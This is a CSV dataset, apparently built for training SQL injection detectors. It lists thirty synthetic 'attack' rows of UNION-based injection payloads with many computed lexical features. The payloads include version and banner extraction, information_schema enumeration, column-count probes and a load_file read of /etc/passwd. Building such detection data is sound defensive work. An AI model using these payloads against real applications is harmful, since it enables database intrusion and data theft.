id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001751,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,1.092973679701776,75.0,32.0,4.390069572565315,44.0,2.666547771954047,17.0,11.333452228045951,0.5866666666666667,0.03555397029272067,0.22666666666666666,0.151112696373946,0.0,0.0,2.0,0.0,1.3334522280459506,1.0,3.469446951953614e-18,0.0,0.6665477719540492,3.469446951953614e-18,1.0,6.333452228045951,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001752,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000038,0.3052408679398765,113.91012765812164,26.19815860761425,4.012491035337916,29.0,51.20736556954301,15.0,18.702762088578627,0.2548165800931833,0.4492910035347091,0.1318016793585431,0.16409073701356447,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,8.801841392385752,5.900920696192876,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.9009206961928758,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001753,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000006,0.951304123083889,56.0751374296112,23.16127061444168,4.157224699726745,27.94624312851944,5.290164915533442,11.0,11.83872938555832,0.5010762482519892,0.08888691409355018,0.19713296685437015,0.21290387080009043,1.94624312851944,0.0,0.05375687148056052,1.8924862570388798,0.0,0.0,0.9462431285194399,1.94624312851944,0.0,0.9462431285194399,4.0537568714805605,1.94624312851944,1.0,0.0,0.0,0.053756871480560076,0.0,0.0,1.0,0.9462431285194399,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9462431285194399,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.94624312851944
SMOTE_001754,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.04706801048375113,61.175688507324146,23.070275402929656,4.035852679161756,27.0,16.140550805859313,11.0,7.035137701464829,0.4414447119479007,0.2637264240040318,0.17984784560840397,0.11498101843966357,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.035137701464829,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001755,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,5.9647918973721135,68.25875829496334,24.9888137442445,4.205869930321288,27.337062085251834,19.910509953956005,11.0,10.011186255755499,0.41025289271027326,0.2720104277061156,0.16464331121343112,0.15309336837017995,1.3370620852518331,0.0,0.6629379147481667,0.6741241705036664,0.0,0.0,0.33706208525183307,1.3370620852518331,0.0,0.33706208525183307,4.662937914748166,1.3370620852518331,1.0,0.0,0.0,0.6629379147481669,0.0,0.0,1.0,0.33706208525183307,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3370620852518332,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3370620852518327
SMOTE_001756,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.002534571576452212,101.99063075282025,27.0,4.113653672698521,28.99583589014233,43.99583589014233,15.001041027464417,13.997917945071165,0.2842975931860353,0.4313712320968192,0.14708483275448733,0.1372463419626582,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.998958972535583,4.998958972535583,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.998958972535583,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.998958972535583
SMOTE_001757,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,0.4634685734863961,94.71324876569915,27.0,4.047203469539987,25.761443895866286,40.76144389586629,15.809639026033429,12.380721947933143,0.27176713716772993,0.430348337727978,0.16728699653910212,0.13059752856519002,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.1903609739665715,4.1903609739665715,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.190360973966572,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1903609739665715
SMOTE_001758,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.5450839073164331,96.2108821125041,27.723639735936988,4.164696860600477,29.0,38.210882112504095,15.0,14.0,0.30182357308483326,0.3963528538303335,0.15611564125077584,0.14570793183405745,2.447279471873977,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.552720528126022,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001759,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,0.7323037792043781,76.61481439142733,25.224592575657095,4.187690897216755,27.0,28.491851513141867,11.0,10.122962878285467,0.3580399077804375,0.36504781573339445,0.14586811057721527,0.13104416590895276,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.122962878285467,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001760,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,1.1926989438006934,52.331651337718455,21.285353858082527,4.1029403903880315,36.953702520364075,1.9023590538835045,8.285353858082527,5.1902359053883504,0.713736373365088,0.029267062367438534,0.15803916623241665,0.0989573980350569,0.09511795269417544,0.0,0.09511795269417522,0.0,0.904882047305825,0.0,3.469446951953614e-18,1.0,0.0,0.9048820473058248,1.1902359053883504,1.0,0.09511795269417511,0.0,0.0,0.09511795269417522,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,0.9048820473058248,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9048820473058249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8097640946116496
SMOTE_001761,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000007,1.31524740295521,52.91617208269752,20.572607551685948,3.880103791555588,33.19834942763967,1.8323441653950354,12.77095697932562,5.11452151033719,0.6305013844312652,0.030539069423250575,0.24236523264418736,0.09659431350129688,0.11452151033718994,0.0,0.11452151033718971,0.0,0.8854784896628103,0.8854784896628103,3.469446951953614e-18,0.11452151033718971,0.0,3.469446951953614e-18,0.22904302067437943,1.8854784896628103,0.11452151033718971,0.0,0.0,0.11452151033718971,0.0,0.8854784896628103,0.11452151033718982,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.8854784896628103,0.8854784896628103,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8854784896628104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.65643546898843
SMOTE_001762,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,0.24705402163517765,61.566078694385055,24.843392130561494,4.169822770190389,27.0,17.25286295550804,11.0,6.31321573887701,0.4399323512503818,0.2785986948143623,0.17923169865756294,0.10223725527769292,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.31321573887701,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001763,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,1.0798039067605978,94.4483902591948,27.0,4.117236604800531,29.0,37.28745800817315,15.0,13.160932251021643,0.30987356238134345,0.3902417770108649,0.1602794288179363,0.13960523178985534,1.8390677489783567,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.321864502043287,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001764,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,1.1454622277797875,105.10602695477291,26.621205390954582,4.028551950261971,66.0,4.0,26.48482156381833,8.621205390954582,0.6291143400722153,0.03812814182255847,0.2509547577551575,0.08180276035006864,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.6212053909545819,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.3106026954772911,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001765,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,3.5799165961926254,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.111090081167443,1.8889099188325573,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.5277725202918607,0.4722274797081393,0.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001766,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.8586804393532776,101.94942903934331,27.0,4.052748796287564,27.556979725526663,45.113959451053326,15.360755068618335,13.917734794144998,0.27023046814294005,0.44192755174095333,0.15167916357672717,0.13616281653937945,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.278489862763331,4.639244931381666,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.6392449313816657,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6392449313816657
SMOTE_001767,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,0.6984160613197429,78.15638608105613,28.168722783788777,4.24237037115483,29.0,23.325108864844896,15.0,10.831277216211225,0.3725007727878656,0.29648171402467827,0.19267281351096496,0.1383446996764912,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.8312772162112245,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001768,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,0.2354822392724298,102.63853190861492,26.127706381722984,4.047608803246452,66.0,4.0,24.510825526891935,8.127706381722984,0.6433698261582121,0.03899211067625524,0.23851360626192397,0.07912445690360864,0.0,0.0,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.12770638172298399,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.06385319086149199,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001769,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000024,0.7437870586235366,72.52346350615045,19.0,3.4124699681749675,14.0,41.39259762961284,4.0,13.130865876537614,0.19488410327059072,0.5690361898201658,0.0556811723630259,0.1803985345462176,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.7827164691344033,3.469446951953614e-18,8.34814940740321,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001770,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,1.6911118279444297,83.72380169220412,29.73827363535449,4.279218459685085,51.10828286031447,2.6462075327558594,19.26172636464551,10.70758493448828,0.6061796000087064,0.03072130216631125,0.22945422857267234,0.13364486925231,0.0,0.0,2.0,0.0,2.0,1.3231037663779301,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.67689623362207,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.3231037663779301,1.3231037663779301,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.64620753275586
SMOTE_001771,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,0.856724407188678,98.83304949433986,27.0,4.084821612420948,27.59246644192883,42.592466441928835,15.351883389517793,13.296233220964416,0.27886075708843394,0.43092740874191304,0.1558503440138854,0.13436149015576768,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.648116610482208,4.648116610482208,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.6481166104822078,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.648116610482208
SMOTE_001772,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,0.060437327232662916,75.4415817889661,28.058877571862148,4.273450772235815,29.235510287448587,20.117755143724295,15.058877571862148,11.029438785931074,0.38738628143387066,0.26666666666666666,0.19967290237854363,0.14627414952091902,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.0294387859310734,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.02943878593107352,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.029438785931074
SMOTE_001773,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,2.1448781674533266,75.52045206697096,32.52045206697096,4.4320575676329375,41.04090413394193,3.0,17.0,14.479547933029036,0.5433771451520713,0.039726077859489006,0.2251144412037708,0.191782335784669,3.0,0.0,2.0,0.0,1.479547933029036,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,5.959095866058071,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.520452066970964,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.520452066970964
SMOTE_001774,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,0.9153171801487006,82.73878080050918,28.788261999681765,4.055521662909994,42.0,3.0,23.738780800509176,14.0,0.5082974947334923,0.03630696390953514,0.2859630431124751,0.1694324982444974,3.0,1.6846952001272937,2.0,0.0,1.0,1.0,3.469446951953614e-18,1.684695200127294,0.0,3.469446951953614e-18,1.0,5.0,1.0,0.8423476000636468,1.0,0.0,0.0,1.0,0.8423476000636468,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001775,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,3.799070789182723,76.06337817071471,28.77229695119118,4.138868754179525,28.544593902382356,21.77229695119118,18.455406097617644,7.291081219523529,0.37423249374543743,0.2857529415256486,0.24389079274625636,0.0961237719826576,0.0,2.0633781707147074,1.936621829285293,0.0,0.0,1.0,3.469446951953614e-18,1.2910812195235284,0.0,3.469446951953614e-18,1.0,2.9366218292852926,0.0,1.0,0.6455406097617643,0.0,0.0,1.0,0.6455406097617643,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.6455406097617643,5.551115123125783e-17,0.3544593902382356,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001776,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,0.5245659086538565,102.88875526042267,27.11124473957734,4.127508049900983,62.0,4.888755260422659,23.88875526042266,12.111244739577339,0.6025982461311437,0.047505998050772935,0.23217320251031698,0.11772255330776643,3.0,0.2224894791546786,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.888755260422661,1.0,0.11124473957733932,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.8887552604226607,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001777,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.50954775238952,75.08780820162539,32.087808201625386,4.391391722127408,43.82438359674923,3.0,17.0,11.263424604876166,0.5836781068218728,0.03995378515703929,0.22640478255655586,0.14996332546453212,0.26342460487616526,0.0,2.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.9121917983746116,3.469446951953614e-18,1.0,5.912191798374612,0.08780820162538838,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.08780820162538838,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.087808201625388
SMOTE_001778,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000061,0.17699246285148923,113.51703316047535,26.0,3.7191249953228707,25.0,51.12120483583725,21.670451813438966,15.725376511199139,0.22105475997906288,0.4498075920727831,0.19078332302519996,0.1383543249229541,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.945075302239828,0.0,3.469446951953614e-18,8.780301208959312,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001779,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.36274085454475524,91.31401030607009,28.134299484696495,4.203466606834035,29.0,33.851208244856075,15.0,13.462802061214019,0.319708697688897,0.36784203622742206,0.16536656777011913,0.14708269831356188,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.462802061214019,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001780,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,0.2250441720956257,64.34490929673625,20.0,3.632156805862484,14.0,34.675927437389,4.0,11.66898185934725,0.21839049508812028,0.5379314058942557,0.06239728431089149,0.18128081470673255,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,6.66898185934725,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
